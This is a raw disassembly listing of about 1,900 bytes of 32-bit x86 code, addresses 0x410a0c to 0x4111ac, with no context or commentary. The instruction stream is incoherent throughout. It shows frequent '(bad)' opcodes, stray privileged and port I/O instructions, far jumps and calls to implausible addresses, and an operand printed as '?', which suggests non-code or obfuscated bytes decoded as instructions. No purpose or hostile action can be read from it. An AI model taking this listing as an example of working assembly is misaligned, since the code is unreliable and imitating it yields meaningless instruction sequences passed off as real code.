  410a0c:	mov    ch,0x21
  410a0e:	lock cmp al,cl
  410a11:	(bad)  
  410a12:	dec    DWORD PTR [ecx]
  410a14:	jg     0x410a94
  410a16:	inc    esi
  410a17:	mov    ah,0x20
  410a19:	mov    edi,0xbb46aceb
  410a1e:	push   es
  410a1f:	push   es
  410a20:	std    
  410a21:	adc    DWORD PTR [ebp+edi*8+0x7396287e],ebx
  410a28:	pusha  
  410a29:	xchg   BYTE PTR [ebx-0x63e7831],al
  410a2f:	jecxz  0x410a54
  410a31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a32:	cmp    al,0xbe
  410a34:	fist   DWORD PTR [ecx+0x7e]
  410a37:	add    edx,0x45f69411
  410a3d:	lahf   
  410a3e:	ss cli 
  410a40:	aas    
  410a41:	(bad)  
  410a42:	push   ss
  410a43:	dec    edi
  410a44:	cmp    ch,BYTE PTR [ecx-0x36]
  410a47:	shl    BYTE PTR [eax-0x35747312],1
  410a4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a4e:	fistp  DWORD PTR [esi-0x6a76af07]
  410a54:	aaa    
  410a55:	and    ah,BYTE PTR [edi+0x6cf385e3]
  410a5b:	push   ecx
  410a5c:	mov    ch,0xd0
  410a5e:	pop    esi
  410a5f:	shl    DWORD PTR [edx],1
  410a61:	xchg   ecx,eax
  410a62:	frstor [ebx+0x78255c7e]
  410a68:	mov    BYTE PTR [edi-0x2a],bh
  410a6b:	xor    dh,BYTE PTR [edx+ebx*2-0x568ed84]
  410a72:	aas    
  410a73:	(bad)  
  410a75:	push   es
  410a76:	mov    dl,0x75
  410a78:	jmp    0x40c5ef66
  410a7d:	popf   
  410a7e:	cs into 
  410a80:	outs   dx,DWORD PTR ds:[esi]
  410a81:	out    0x4b,al
  410a83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a84:	stc    
  410a85:	addr16 fwait
  410a87:	mov    ebp,0x82b625a
  410a8c:	inc    ecx
  410a8d:	pop    edx
  410a8e:	ror    BYTE PTR [ebx+0x583df364],cl
  410a94:	int3   
  410a95:	sub    bl,BYTE PTR [esi+esi*1]
  410a98:	lods   al,BYTE PTR ds:[esi]
  410a99:	bound  ebp,QWORD PTR [ecx-0x61]
  410a9c:	(bad)  
  410a9d:	ds iret 
  410a9f:	out    0x5,al
  410aa1:	ret    
  410aa2:	mov    si,0x3c03
  410aa6:	rcr    esi,cl
  410aa8:	call   0xdc56892b
  410aad:	sub    dh,al
  410aaf:	cmp    DWORD PTR [edi],edx
  410ab1:	das    
  410ab2:	mov    DWORD PTR [eax],eax
  410ab4:	mov    BYTE PTR [ebx-0x763168e8],al
  410aba:	ret    0x230c
  410abd:	jns    0x410b09
  410abf:	jecxz  0x410a9d
  410ac1:	in     eax,dx
  410ac2:	sub    eax,0x8edd621
  410ac7:	mov    eax,ds:0xd2485601
  410acc:	mov    dh,0xc3
  410ace:	aas    
  410acf:	lock call 0x3e37:0x2a812a2a
  410ad7:	loopne 0x410a8d
  410ad9:	and    eax,0x1d511bfb
  410ade:	xchg   ebp,eax
  410adf:	mov    esi,0xc214e0bb
  410ae4:	icebp  
  410ae5:	ins    DWORD PTR es:[edi],dx
  410ae6:	cmp    edx,DWORD PTR [ebx+0x66]
  410ae9:	fwait
  410aea:	(bad)  
  410aeb:	fs dec eax
  410aed:	pop    ebp
  410aee:	subps  xmm3,XMMWORD PTR [ecx]
  410af1:	push   esi
  410af2:	xchg   ecx,eax
  410af3:	(bad)  
  410af4:	mul    DWORD PTR [ebx]
  410af6:	mov    edx,edx
  410af8:	repz mov bl,0xc4
  410afb:	mov    ds:0x599df08b,eax
  410b00:	jae    0x410a9b
  410b02:	and    DWORD PTR ds:0xb2ca5afc,0x73
  410b09:	adc    BYTE PTR [eax],ah
  410b0b:	jge    0x410b54
  410b0d:	cmp    eax,0x7e3f85d
  410b12:	repz mov WORD PTR [edx+0x62],es
  410b16:	stos   DWORD PTR es:[edi],eax
  410b17:	jb     0x410b84
  410b19:	mov    edi,0x6543df3f
  410b1e:	bswap  ebp
  410b20:	fld    DWORD PTR [eax+0x15]
  410b23:	das    
  410b24:	and    esp,DWORD PTR [esi+esi*8+0x76]
  410b28:	xchg   esi,eax
  410b29:	and    BYTE PTR [ebx-0x5841e4f5],dl
  410b2f:	dec    ebp
  410b30:	mov    edx,0x19acfae8
  410b35:	and    edx,DWORD PTR [ecx-0x7c4f8d0]
  410b3b:	xchg   edi,eax
  410b3c:	cwde   
  410b3d:	(bad)  
  410b3e:	repz sbb al,0xd4
  410b41:	or     BYTE PTR [edx+0x22],0x6f
  410b45:	aaa    
  410b46:	jle    0x410b70
  410b48:	enter  0xc07f,0x1e
  410b4c:	imul   esp,DWORD PTR [edx+0x76f1f123],0xa6032321
  410b56:	push   ss
  410b57:	stc    
  410b58:	test   dh,0x33
  410b5b:	ror    DWORD PTR [edi],cl
  410b5d:	nop
  410b5e:	dec    eax
  410b5f:	shl    BYTE PTR [edx-0x5c0d95],0x33
  410b66:	test   eax,0x6a31b259
  410b6b:	outs   dx,DWORD PTR ds:[esi]
  410b6c:	add    BYTE PTR [ecx+ebx*2],bl
  410b6f:	sar    DWORD PTR [edx],cl
  410b71:	xchg   BYTE PTR [ebp+0x3a],bl
  410b74:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  410b76:	inc    ebx
  410b77:	add    esi,DWORD PTR [ebx]
  410b79:	jae    0x410bd2
  410b7b:	int3   
  410b7c:	xchg   sp,ax
  410b7e:	mov    DWORD PTR es:[edx+0x6],esi
  410b82:	lods   eax,DWORD PTR ds:[esi]
  410b83:	idiv   bl
  410b85:	js     0x410b71
  410b87:	std    
  410b88:	loope  0x410b6f
  410b8a:	or     ecx,0x2e
  410b8d:	test   ch,0x61
  410b90:	mov    bh,0x9f
  410b92:	call   0x97f42783
  410b97:	fadd   QWORD PTR ds:0x840d98d1
  410b9d:	mov    BYTE PTR [eax-0x55],al
  410ba0:	sbb    DWORD PTR [esi-0x59],esp
  410ba3:	and    BYTE PTR gs:[ebp+0x1a],0xd7
  410ba8:	sub    bh,BYTE PTR [edx-0x36]
  410bab:	(bad)  
  410bac:	retf   
  410bad:	push   ds
  410bae:	out    0x5c,al
  410bb0:	fimul  WORD PTR [esi-0x7e0f4e84]
  410bb6:	mov    ebx,0x87b2bf5a
  410bbb:	mov    ecx,0xc8e39658
  410bc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bc2:	cmp    BYTE PTR [edx-0x4f94890e],bh
  410bc8:	cmc    
  410bc9:	shl    BYTE PTR [edi+0x2],1
  410bcc:	imul   esi,DWORD PTR [eax],0xfffffff6
  410bcf:	and    DWORD PTR [ecx+0x753df53a],0xffffff84
  410bd6:	lods   eax,DWORD PTR ds:[esi]
  410bd7:	mov    cl,0x64
  410bd9:	outs   dx,BYTE PTR ds:[esi]
  410bda:	out    0x71,al
  410bdc:	push   esi
  410bdd:	pop    ebp
  410bde:	pop    edx
  410bdf:	loope  0x410c1a
  410be1:	sub    eax,0xfa792352
  410be6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410be7:	dec    DWORD PTR [ebx-0x21]
  410bea:	inc    ebx
  410beb:	jno    0x410c6b
  410bed:	xchg   BYTE PTR [eax-0x4a],bh
  410bf0:	inc    ecx
  410bf1:	cmp    DWORD PTR [eax+0x74fc90eb],edi
  410bf7:	(bad)  
  410bf8:	out    dx,eax
  410bf9:	hlt    
  410bfa:	int    0xd0
  410bfc:	sub    esp,ecx
  410bfe:	popa   
  410bff:	aas    
  410c00:	xor    eax,0x49fbca96
  410c05:	add    BYTE PTR [edx-0x1b],dl
  410c08:	cmp    dl,BYTE PTR [edi]
  410c0a:	mov    BYTE PTR [ecx+0xb],ch
  410c0d:	popf   
  410c0e:	jae    0x410ba4
  410c10:	xor    al,0x5e
  410c12:	and    BYTE PTR [ebp-0x27],cl
  410c15:	push   eax
  410c16:	jno    0x410bf2
  410c18:	pop    edx
  410c19:	cmp    BYTE PTR [ecx+0x3ce14c89],dh
  410c1f:	lock inc ebx
  410c21:	mov    bh,0x9b
  410c23:	mov    edi,edx
  410c25:	sub    esp,DWORD PTR [ecx+0x39]
  410c28:	sub    edi,DWORD PTR [eax-0x79]
  410c2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c2c:	lds    ebp,FWORD PTR [ebp+0x243029b8]
  410c32:	mov    cl,0x37
  410c34:	inc    esp
  410c35:	daa    
  410c36:	add    BYTE PTR ds:0x4cf369a3,0xfb
  410c3d:	mov    cl,0x31
  410c3f:	leave  
  410c40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c41:	xor    ebx,0x5add6e59
  410c47:	pop    esi
  410c48:	sub    bl,BYTE PTR [eax+0x19]
  410c4b:	lods   eax,DWORD PTR ds:[esi]
  410c4c:	xchg   ecx,eax
  410c4d:	mov    bl,0xef
  410c4f:	xlat   BYTE PTR ds:[ebx]
  410c50:	not    BYTE PTR [edi]
  410c52:	bound  esi,QWORD PTR [esi-0x36]
  410c55:	je     0x410c54
  410c57:	ror    ebx,0x2e
  410c5a:	xchg   ebp,eax
  410c5b:	in     eax,dx
  410c5c:	les    esp,FWORD PTR [edi+0x74]
  410c5f:	retf   0x1987
  410c62:	adc    BYTE PTR es:[edi-0x2d81924a],ch
  410c69:	jno    0x410bf5
  410c6b:	jmp    0x410c71
  410c6d:	sub    dh,BYTE PTR [ebx]
  410c6f:	mov    ah,BYTE PTR [eax+ebx*8]
  410c72:	adc    DWORD PTR [ebp+0x7b],edx
  410c75:	xchg   esi,eax
  410c76:	fsub   QWORD PTR [eax+0x13a55634]
  410c7c:	test   eax,0xe92132e2
  410c81:	jb     0x410c6d
  410c83:	mov    edi,0x294509ef
  410c88:	sub    ah,BYTE PTR [edi-0x1af68c4a]
  410c8e:	(bad)  
  410c8f:	mov    WORD PTR [ecx-0x1b],?
  410c92:	xlat   BYTE PTR ds:[ebx]
  410c93:	inc    ebx
  410c94:	gs cs (bad) 
  410c97:	push   ebx
  410c98:	mov    ebx,DWORD PTR [esi+0x6c39aa2f]
  410c9e:	inc    esp
  410c9f:	loope  0x410c98
  410ca1:	and    ch,bl
  410ca3:	push   0x5c
  410ca5:	pushf  
  410ca6:	push   0xffffffa2
  410ca8:	mov    cl,0xf2
  410caa:	jbe    0x410d2b
  410cac:	push   0x35
  410cae:	shl    bh,cl
  410cb0:	jp     0x410d0a
  410cb2:	sahf   
  410cb3:	stos   DWORD PTR es:[edi],eax
  410cb4:	inc    edi
  410cb5:	pop    edi
  410cb6:	adc    DWORD PTR [edi-0x28],esi
  410cb9:	test   eax,0x419fe514
  410cbe:	jae    0x410d33
  410cc0:	aas    
  410cc1:	xchg   esi,eax
  410cc2:	xchg   esi,eax
  410cc3:	stos   BYTE PTR es:[edi],al
  410cc4:	cmp    al,0x47
  410cc6:	xchg   DWORD PTR [esi+0x52a1786],eax
  410ccc:	es out dx,al
  410cce:	std    
  410ccf:	inc    ecx
  410cd0:	loope  0x410cf9
  410cd2:	push   es
  410cd3:	sbb    bh,BYTE PTR [edx]
  410cd5:	pop    ebx
  410cd6:	lahf   
  410cd7:	test   ch,ah
  410cd9:	adc    dh,dh
  410cdb:	sub    cl,0x13
  410cde:	outs   dx,BYTE PTR ds:[esi]
  410cdf:	retf   
  410ce0:	test   dl,dl
  410ce2:	mov    ds:0xac148c9e,eax
  410ce7:	inc    eax
  410ce8:	aas    
  410ce9:	enter  0xf54b,0x95
  410ced:	aad    0x9a
  410cef:	dec    eax
  410cf0:	or     dl,ah
  410cf2:	outs   dx,DWORD PTR ds:[esi]
  410cf3:	inc    edi
  410cf4:	xchg   ebx,eax
  410cf5:	ror    edx,1
  410cf7:	adc    DWORD PTR [edx-0x71ae489c],edx
  410cfd:	and    BYTE PTR [ecx],bl
  410cff:	cmp    cl,bl
  410d01:	cli    
  410d02:	addr16 jp 0x410c98
  410d05:	stos   DWORD PTR es:[edi],eax
  410d06:	js     0x410d55
  410d08:	cmp    eax,0x2df659f9
  410d0d:	ins    BYTE PTR es:[edi],dx
  410d0e:	mov    dl,0xa3
  410d10:	repnz pop es
  410d12:	das    
  410d13:	or     esi,DWORD PTR ds:0x85cb4240
  410d19:	(bad)  
  410d1a:	cmp    esi,ebx
  410d1c:	ror    DWORD PTR [esp+ebp*8-0x3e1faf32],cl
  410d23:	(bad)  
  410d24:	sub    ah,BYTE PTR [eax-0x476307d8]
  410d2a:	add    esp,DWORD PTR [edx]
  410d2c:	test   eax,0x36c063ea
  410d31:	fimul  DWORD PTR [edx+0x47]
  410d34:	pop    ds
  410d35:	pop    ds
  410d36:	jg     0x410d4b
  410d38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d39:	xchg   esp,eax
  410d3a:	(bad)  
  410d3b:	fisub  WORD PTR [ecx-0x6cda21eb]
  410d41:	retf   
  410d42:	adc    DWORD PTR [esi+0x3f],ebp
  410d45:	int    0x2e
  410d47:	scas   eax,DWORD PTR es:[edi]
  410d48:	fmul   QWORD PTR [ecx-0x1cdee644]
  410d4e:	mov    bl,BYTE PTR [esi+ebx*2]
  410d51:	mov    ebp,0xff0eb28c
  410d56:	into   
  410d57:	xor    eax,0x4e84aff6
  410d5c:	dec    ecx
  410d5d:	(bad)  
  410d5f:	hlt    
  410d60:	aaa    
  410d61:	pop    esi
  410d62:	push   esp
  410d63:	(bad)  
  410d64:	repz add esi,DWORD PTR ds:0xb4b38d76
  410d6b:	inc    edi
  410d6c:	cmp    eax,esp
  410d6e:	mov    ah,0x5
  410d70:	mov    eax,eax
  410d72:	popf   
  410d73:	dec    ecx
  410d74:	xor    bh,BYTE PTR [ebx]
  410d76:	xlat   BYTE PTR ds:[ebx]
  410d77:	jne    0x410d8b
  410d79:	add    BYTE PTR [esi],cl
  410d7b:	ins    BYTE PTR es:[edi],dx
  410d7c:	sahf   
  410d7d:	iret   
  410d7e:	cld    
  410d7f:	sub    BYTE PTR [esi-0x74],al
  410d82:	mov    bl,0xb
  410d84:	in     eax,0x51
  410d86:	mov    bh,0xab
  410d88:	cmp    eax,0x58c3a275
  410d8d:	xchg   ecx,eax
  410d8e:	iret   
  410d8f:	nop
  410d90:	jge    0x410df1
  410d92:	add    bh,BYTE PTR [edi]
  410d94:	adc    al,0xd4
  410d96:	cmp    eax,0xa5da45e4
  410d9b:	dec    edx
  410d9c:	out    0xb3,al
  410d9e:	or     BYTE PTR [ebx],bl
  410da0:	(bad)  
  410da1:	bound  edi,QWORD PTR [ecx-0x25]
  410da4:	mov    esi,0xbe68da5d
  410da9:	repnz dec esp
  410dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dac:	pop    ecx
  410dad:	add    DWORD PTR [ecx],0xffffffe4
  410db0:	inc    esp
  410db1:	jno    0x410dc1
  410db3:	fld    DWORD PTR [edx]
  410db5:	xor    BYTE PTR [esi+0x2437b8ad],0x82
  410dbc:	adc    BYTE PTR [ecx+0x7e],al
  410dbf:	mov    eax,0xa9020980
  410dc4:	mov    ebp,0x25e67adf
  410dc9:	sub    esp,DWORD PTR ds:0xe26555c8
  410dcf:	scas   eax,DWORD PTR es:[edi]
  410dd0:	mov    eax,ds:0xbe3424b2
  410dd5:	rcl    BYTE PTR [ebp+0x1f],cl
  410dd8:	push   eax
  410dd9:	repz test BYTE PTR [eax],dh
  410ddc:	adc    DWORD PTR [edi-0xf],esi
  410ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410de0:	xor    BYTE PTR [ecx+0x51],bl
  410de3:	rol    BYTE PTR [eax],1
  410de5:	fld    TBYTE PTR ds:0xbe33f9e0
  410deb:	popa   
  410dec:	sub    al,0xc0
  410dee:	fmul   QWORD PTR [eax-0x5e403886]
  410df4:	sub    DWORD PTR [eax+0x3fb0d0ea],eax
  410dfa:	ss ins BYTE PTR es:[edi],dx
  410dfc:	jle    0x410dca
  410dfe:	or     dl,BYTE PTR [esi+0x54]
  410e01:	ficomp DWORD PTR [eax]
  410e03:	mov    esi,0xb5ed2ac9
  410e08:	das    
  410e09:	inc    edx
  410e0a:	aad    0xe4
  410e0c:	rol    BYTE PTR [esi+0x4c],cl
  410e0f:	mov    dh,BYTE PTR [esi+0x7c]
  410e12:	sbb    edi,DWORD PTR [ebp+0x77]
  410e15:	adc    DWORD PTR [eax],0x2
  410e18:	lods   al,BYTE PTR ds:[esi]
  410e19:	pop    edx
  410e1a:	sub    al,0x49
  410e1c:	rol    DWORD PTR [edi],1
  410e1e:	test   al,0xbd
  410e20:	dec    edi
  410e21:	shl    DWORD PTR [ecx+0x6b],0xfc
  410e25:	jmp    0x5c999cf
  410e2a:	(bad)  
  410e2b:	rcr    DWORD PTR [ebp-0x59],1
  410e2e:	repz jp 0x410e9a
  410e31:	fstp   QWORD PTR [ebp+0x67]
  410e34:	inc    esi
  410e35:	mov    bh,0xc4
  410e37:	stc    
  410e38:	pop    edi
  410e39:	adc    al,0xfc
  410e3b:	ss cmp ecx,edi
  410e3e:	xor    ebp,edx
  410e40:	jmp    DWORD PTR ds:0xf509787a
  410e46:	repz in eax,dx
  410e48:	sub    eax,0x2dcbe2ad
  410e4d:	test   eax,0xad32d0e9
  410e52:	bound  esp,QWORD PTR [eax-0x2dccbabf]
  410e58:	and    esp,DWORD PTR [edi+0x2a82e940]
  410e5e:	pand   mm2,QWORD PTR [eax-0x48f810b1]
  410e65:	mov    BYTE PTR [esi-0x52],ch
  410e68:	inc    esp
  410e69:	cmc    
  410e6a:	cmp    DWORD PTR [si+0x65],ecx
  410e6e:	fild   QWORD PTR [edx-0x6365e8d9]
  410e74:	mov    al,0xfc
  410e76:	mov    cl,0xdd
  410e78:	jns    0x410e8d
  410e7a:	push   0xffffff94
  410e7c:	test   al,0x56
  410e7e:	cli    
  410e7f:	(bad)  
  410e80:	sbb    eax,ecx
  410e82:	adc    eax,0x4eb1c3c
  410e87:	mov    bl,0x99
  410e89:	shl    cl,cl
  410e8b:	fstp   QWORD PTR [edx+0x2f]
  410e8e:	cmp    al,0x47
  410e90:	aas    
  410e91:	jmp    DWORD PTR [eax]
  410e93:	imul   eax,DWORD PTR [edx-0x3bc1a31f],0x606c87c8
  410e9d:	test   eax,0xd4fbbcf5
  410ea2:	cmc    
  410ea3:	and    al,dl
  410ea5:	mov    DWORD PTR [ecx-0x2d68adbe],eax
  410eab:	les    ecx,FWORD PTR ds:0xf795400
  410eb1:	xor    ebx,DWORD PTR [edi]
  410eb3:	jnp    0x410e55
  410eb5:	adc    eax,0x87934e29
  410eba:	cmp    eax,0x8991acfa
  410ebf:	icebp  
  410ec0:	fiadd  DWORD PTR ds:[edx-0x4c]
  410ec4:	dec    esp
  410ec5:	and    cl,cl
  410ec7:	push   edx
  410ec8:	lds    eax,FWORD PTR ds:0x2596019e
  410ece:	cmc    
  410ecf:	xchg   DWORD PTR [eax],edx
  410ed1:	mov    cl,0x13
  410ed3:	sahf   
  410ed4:	in     al,0x97
  410ed6:	cmp    al,0x1e
  410ed8:	sbb    eax,0xe7608dc4
  410edd:	xchg   bh,al
  410edf:	retf   
  410ee0:	retf   0x2561
  410ee3:	pushf  
  410ee4:	mov    ebp,0x14cedfee
  410ee9:	(bad)  
  410eea:	mov    eax,0x8616fa42
  410eef:	cmp    eax,0x85b2cd6f
  410ef4:	xor    al,0xd9
  410ef6:	sbb    cl,BYTE PTR [eax-0x5525460d]
  410efc:	dec    esi
  410efd:	pop    esp
  410efe:	xor    ebp,ebp
  410f00:	in     eax,dx
  410f01:	mov    bl,0xee
  410f03:	hlt    
  410f04:	and    eax,0x6d7e3df1
  410f09:	inc    ebx
  410f0a:	push   edi
  410f0b:	inc    ebx
  410f0c:	lods   al,BYTE PTR ds:[esi]
  410f0d:	dec    ecx
  410f0e:	icebp  
  410f0f:	and    cl,BYTE PTR [ecx+ebp*1-0x28]
  410f13:	and    DWORD PTR [edi+edx*4-0xb],esp
  410f17:	repz or DWORD PTR [esi+0x8],ecx
  410f1b:	fisttp QWORD PTR [edx]
  410f1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f1e:	imul   eax,DWORD PTR [ebp+0x2e],0xffffff82
  410f22:	(bad)  
  410f23:	jne    0x410f19
  410f25:	mov    DWORD PTR [edi+0x1f9526ed],edx
  410f2b:	fidiv  WORD PTR [esi+0x68]
  410f2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f2f:	imul   edx,ebp,0x58069c1f
  410f35:	enter  0x2e31,0xd9
  410f39:	xlat   BYTE PTR ds:[ebx]
  410f3a:	pop    ebp
  410f3b:	hlt    
  410f3c:	and    dh,ah
  410f3e:	xchg   ebx,eax
  410f3f:	jae    0x410f6e
  410f41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f42:	fidivr DWORD PTR [ecx+0x36]
  410f45:	cmp    edx,DWORD PTR [ecx-0x120b3b3a]
  410f4b:	pop    edx
  410f4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f4d:	pop    edi
  410f4e:	cmp    eax,0x29ef73d4
  410f53:	rcr    edx,0xa
  410f56:	xchg   ebp,eax
  410f57:	aam    0x3d
  410f59:	mov    eax,ds:0xe816641c
  410f5e:	aaa    
  410f5f:	add    ah,bl
  410f61:	xor    DWORD PTR [edi+0x25],esi
  410f64:	add    eax,0x910bec6e
  410f69:	pushf  
  410f6a:	push   ebp
  410f6b:	cli    
  410f6c:	or     DWORD PTR [edx],0xcddac390
  410f72:	dec    ecx
  410f73:	jnp    0x410fc2
  410f75:	xchg   esp,eax
  410f76:	mul    BYTE PTR [edi-0x25243a4a]
  410f7c:	mov    edi,0x52ffe267
  410f81:	popa   
  410f82:	xchg   edx,eax
  410f83:	cmp    eax,0xfac04774
  410f88:	nop
  410f89:	mov    ah,0xd3
  410f8b:	aaa    
  410f8c:	loope  0x410f32
  410f8e:	mov    WORD PTR [ebx+0x4],ss
  410f91:	and    al,ch
  410f93:	adc    dh,BYTE PTR [edi+0x2346ac5d]
  410f99:	jg     0x410fcd
  410f9b:	fnstenv [ecx+0x6a]
  410f9e:	xchg   edx,eax
  410f9f:	push   ebx
  410fa0:	nop
  410fa1:	das    
  410fa2:	ds xor al,0x25
  410fa5:	int3   
  410fa6:	in     al,dx
  410fa7:	mov    cl,0xbd
  410fa9:	int3   
  410faa:	bound  edx,QWORD PTR [eax]
  410fac:	retf   0xc6fc
  410faf:	jns    0x410f71
  410fb1:	add    DWORD PTR [edx+0x26a65320],edx
  410fb7:	hlt    
  410fb8:	mov    dh,0x15
  410fba:	scas   al,BYTE PTR es:[edi]
  410fbb:	std    
  410fbc:	ret    0xfbfb
  410fbf:	mov    al,ds:0xa5c708a0
  410fc4:	add    DWORD PTR [esi],esi
  410fc6:	push   es
  410fc7:	push   eax
  410fc8:	idiv   DWORD PTR [ecx-0x1c]
  410fcb:	sbb    eax,0xc7520ccf
  410fd0:	and    al,0x3d
  410fd2:	xor    edx,edx
  410fd4:	mov    al,ds:0x58d21d19
  410fd9:	mov    BYTE PTR [ebp+0xf],0xc5
  410fdd:	out    dx,eax
  410fde:	jmp    0x411017
  410fe0:	jle    0x411009
  410fe2:	and    DWORD PTR [esp+edx*2],ecx
  410fe5:	test   BYTE PTR es:[edx+esi*4+0xc],bl
  410fea:	add    eax,0xfcde2fae
  410fef:	ins    DWORD PTR es:[edi],dx
  410ff0:	mov    dl,0x15
  410ff2:	gs jmp 0x4839:0x2ca17815
  410ffa:	jmp    0xc237:0x76b51e8f
  411001:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411002:	shl    BYTE PTR [ecx+0x1a27de5a],cl
  411008:	xchg   bl,bh
  41100a:	bound  edx,QWORD PTR [eax+0x29]
  41100d:	mov    ebx,0x9ff6b8c9
  411012:	lock cmp BYTE PTR [esi],0xd4
  411016:	leave  
  411017:	js     0x411072
  411019:	xchg   esp,eax
  41101a:	pop    eax
  41101b:	xchg   esp,eax
  41101c:	not    BYTE PTR [esi+ebp*8-0x4e]
  411020:	(bad)  
  411021:	and    BYTE PTR [ebp+edi*8-0x51],bh
  411025:	lea    ecx,[ecx-0x6a2181bb]
  41102b:	leave  
  41102c:	adc    al,0x7f
  41102e:	in     al,dx
  41102f:	(bad)  fs:[ecx+0x49817d41]
  411036:	aad    0xec
  411038:	jb     0x41107d
  41103a:	in     al,0xb4
  41103c:	lahf   
  41103d:	fs xchg ecx,eax
  41103f:	pop    edx
  411040:	add    eax,0x38bcc19b
  411045:	add    ecx,DWORD PTR [edx+0x3]
  411048:	div    BYTE PTR [ebp+0x38]
  41104b:	push   ss
  41104c:	xchg   esi,eax
  41104d:	xchg   ecx,edi
  41104f:	xchg   esp,eax
  411050:	jmp    0xf61:0xf5cebb86
  411057:	(bad)  
  411059:	add    eax,0x478efe62
  41105e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41105f:	cmp    dh,bh
  411061:	add    DWORD PTR [ebp-0x680bb473],ebx
  411067:	test   BYTE PTR [ebp+0x2fc43546],0x8c
  41106e:	mov    edx,0x82f49c1b
  411073:	push   esp
  411074:	iret   
  411075:	and    al,0x2c
  411077:	mov    bh,bh
  411079:	jb     0x4110c0
  41107b:	cmp    edx,esp
  41107d:	jecxz  0x411047
  41107f:	nop
  411080:	and    BYTE PTR [edi+0x18e97d7c],bh
  411086:	sub    al,0x55
  411088:	retf   
  411089:	push   ecx
  41108a:	aas    
  41108b:	pushf  
  41108c:	jno    0x4110a5
  41108e:	mov    cl,0xaf
  411090:	mov    cl,dl
  411092:	imul   edi,DWORD PTR [edx],0xb70895e0
  411098:	sbb    ch,bh
  41109a:	bound  esp,QWORD PTR [edi-0x6d]
  41109d:	mov    DWORD PTR [ebx-0x7a1561c8],edx
  4110a3:	xor    eax,0x39571286
  4110a8:	add    al,0x19
  4110aa:	mov    esp,0x44144403
  4110af:	dec    edi
  4110b0:	lods   al,BYTE PTR ds:[esi]
  4110b1:	add    bh,0x4f
  4110b4:	je     0x4110de
  4110b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110b8:	xor    ch,BYTE PTR [ebx-0x12]
  4110bb:	jg     0x4110f0
  4110bd:	popa   
  4110be:	dec    ebp
  4110bf:	lods   al,BYTE PTR ds:[esi]
  4110c0:	push   esi
  4110c1:	call   0x320590c7
  4110c6:	sub    dl,dl
  4110c8:	jle    0x41109f
  4110ca:	add    eax,eax
  4110cc:	xchg   esi,eax
  4110cd:	cmp    bh,BYTE PTR [ebx+0x272eb993]
  4110d3:	mov    ds:0xac2f52ca,al
  4110d8:	aaa    
  4110d9:	mov    dl,0x6
  4110db:	and    al,0xd8
  4110dd:	popa   
  4110de:	mov    ds,edx
  4110e0:	mov    bl,0x4c
  4110e2:	dec    esi
  4110e3:	mov    dh,0x1a
  4110e5:	out    dx,al
  4110e6:	data16 adc bl,BYTE PTR [edx]
  4110e9:	iret   
  4110ea:	sbb    al,0xac
  4110ec:	fmulp  st(4),st
  4110ee:	pusha  
  4110ef:	and    DWORD PTR [ecx-0x63080693],ebp
  4110f5:	and    eax,0x4b92b2b4
  4110fa:	mov    ds:0xc2fc73b8,eax
  4110ff:	jns    0xc21fc53e
  411105:	xchg   ecx,eax
  411106:	push   esp
  411107:	push   esp
  411108:	or     ch,BYTE PTR [ebx-0x2]
  41110b:	in     al,0xf
  41110d:	push   0x55
  41110f:	sbb    edi,DWORD PTR [ebx]
  411111:	test   DWORD PTR ds:0x73b5d039,edi
  411117:	mov    ecx,0x6fc9dc2f
  41111c:	icebp  
  41111d:	ins    BYTE PTR es:[edi],dx
  41111e:	(bad)  
  41111f:	(bad)  
  411120:	cmp    BYTE PTR [ecx+0x15ac12b0],ah
  411126:	out    0xf5,eax
  411128:	ret    0x3358
  41112b:	sbb    al,0x2d
  41112d:	cmp    al,0x4f
  41112f:	daa    
  411130:	sub    eax,0x2174efb9
  411135:	mov    dl,0x39
  411137:	outs   dx,BYTE PTR ds:[esi]
  411138:	mov    ah,BYTE PTR [eax+ebx*1+0xa]
  41113c:	cld    
  41113d:	fadd   DWORD PTR [eax-0x8]
  411140:	add    BYTE PTR [edi],cl
  411142:	sub    DWORD PTR ds:0xa624767f,ecx
  411148:	add    DWORD PTR [eax+ecx*2-0x75],esp
  41114c:	loop   0x41116d
  41114e:	mov    ah,0x1b
  411150:	adc    eax,0x1bbea99
  411155:	(bad)  
  411156:	repz imul edi,DWORD PTR [ebp-0x12],0x1d442006
  41115e:	mov    al,BYTE PTR [ebp+0x79]
  411161:	mov    bl,0xc6
  411163:	stc    
  411164:	addr16 jns 0x411158
  411167:	aas    
  411168:	add    eax,0x301c92be
  41116d:	scas   eax,DWORD PTR es:[edi]
  41116e:	push   esp
  41116f:	mov    ch,0x69
  411171:	mov    ebx,0xbe1da00
  411176:	xor    eax,ebp
  411178:	popf   
  411179:	push   eax
  41117a:	jb     0x41116d
  41117c:	ficom  WORD PTR [ecx-0x70e22f71]
  411182:	pushf  
  411183:	es aad 0x7c
  411186:	pop    ebp
  411187:	mov    edx,0x7a2af160
  41118c:	pop    edx
  41118d:	lods   eax,DWORD PTR ss:[esi]
  41118f:	xor    eax,0x3ea5ed63
  411194:	adc    eax,0xa43be680
  411199:	jge    0x41119a
  41119b:	cmp    BYTE PTR [ebp+0x27],bl
  41119e:	push   ss
  41119f:	pop    ds
  4111a0:	inc    ecx
  4111a1:	adc    al,0x3d
  4111a3:	ss dec esi
  4111a5:	ror    DWORD PTR [ecx-0x7ad2fab],1
  4111ab:	in     al,dx
  4111ac:	(bad)  
